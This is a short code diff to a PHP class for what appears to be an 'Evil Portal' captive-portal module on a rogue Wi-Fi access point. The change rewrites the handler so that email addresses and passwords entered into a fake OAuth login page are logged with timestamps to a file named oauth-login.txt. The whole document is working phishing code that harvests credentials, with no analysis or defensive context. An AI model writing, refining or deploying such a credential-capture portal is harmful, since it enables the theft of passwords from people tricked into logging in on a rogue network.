@@ -11,10 +11,12 @@ class MyPortal extends Portal
         }
 
         if (isset($_POST['email'])) {
-          file_put_contents("/sd/evilportal-logs/oauth-login.txt", $_POST['email'] . ' : ' . $_POST['password'] . "\n", FILE_APPEND);
+            $email = isset($_POST['email']) ? $_POST['email'] : 'email';
+            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
+            file_put_contents("/sd/evilportal-logs/oauth-login.txt", date('Y-m-d H:i:s') .  " {$email} - {$pwd}\n", FILE_APPEND);
         }
         // handle form input or other extra things there
-
+        
         // Call parent to handle basic authorization first
         parent::handleAuthorization();
 
